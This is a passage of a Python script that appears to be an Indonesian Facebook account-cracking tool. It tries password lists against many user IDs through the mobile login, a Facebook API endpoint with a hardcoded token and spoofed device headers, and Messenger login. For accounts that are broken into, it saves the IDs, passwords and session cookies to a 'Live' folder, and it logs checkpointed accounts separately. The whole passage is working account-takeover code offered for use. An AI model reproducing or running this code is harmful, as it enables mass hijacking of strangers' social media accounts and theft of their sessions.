"https://m.facebook.com/login.php?skip_FIRE_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ses.post("https://m.facebook.com/login/device-based/login/async/?api_key=190291501407&auth_token=563a4d0ad69493ce0947d19e95df8085&skip_FIRE_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&refsrc=deprecated&app_id=190291501407&cancel=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&lwv=100",data=data, headers=hd2, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}≥ {H}{uid}|{pw} ≥ luci-sukses{P}")
				print(f"\r{P}≥ {H}{kuki};{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}≥ {K}{uid}|{pw} ≥ luci-checkpoint{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1	
	
"""METODE PANAS"""
def _FIRE_(uid,pasw):
	global loop,ok,cp,a2f;sys.stdout.write(f"\r{P}≥ LuciverApi {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),;sys.stdout.flush();ses = requests.Session()	
	for pw in pasw:
		try:
			if 'ualuci' in ualucipler: ua = ualuci[0]
			else:ua = api()
			headers_ = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers_)
			xxx = json.loads(response.text)
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				coki = xxx["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				print(f"\r{P}≥ {H}{uid}|{pw} ≥ luci-sukses{P}")
				print(f"\r{P}≥ {H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				print(f"\r{P}≥ {K}{uid}|{pw} ≥ luci-checkpoint{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			elif 'Login approvals' in response.json()['error_msg']:
				a2f+=1
				print(f"\r{P}≥ {M}{uid}|{pw} ≥ A2F{P}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
			
	

"""METODE MESENJERR"""
def _MSGR_(uid,pasw):
	global loop,ok,cp;sys.stdout.write(f"\r{P}≥ LuciverMesengger {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),;sys.stdout.flush();ses = requests.Session()	
	while True:
		try:
			if 'ualuci' in ualucipler: ua = ualuci[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
			headers = {"Host": "www.messenger.com","Connection": "keep-alive","Content-Length": "267","Cache-Control": "max-age=0","sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',"sec-ch-ua-mobile": "?0","sec-ch-ua-platform": '"Linux"',"Upgrade-Insecure-Requests": "1","Origin": "https://www.messenger.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://www.messenger.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"}			
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {"jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),"lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),"initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),"timezone":"-420","lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),"lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),"lgnjs":"n","email":uid,"pass":"Sungkem Puh Sepuhh","login":"1","persistent":"1","default_persistent":""}			
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"});break			
		except:pass
	for pw in pasw:
		try:
			data.update({"pass":"".join(pw)});response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)		
			if "c_user" in ses.cookies.get_dict():
				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
				print(f"\r{P}≥ {H}{uid}|{pw} ≥ luci-sukses{P}")
				print(f"\r{P}≥ {H}{kuki}{P}")
				ok +=1
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
				print(f"\r{P}≥ {K}{uid}|{pw} ≥ luci-checkpoint{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				cp+=1
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(15)
		except:pass
	loop+=1
	
        
if __name__=='__main__':
	os.system('clear')
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass;MenuLuciver()
	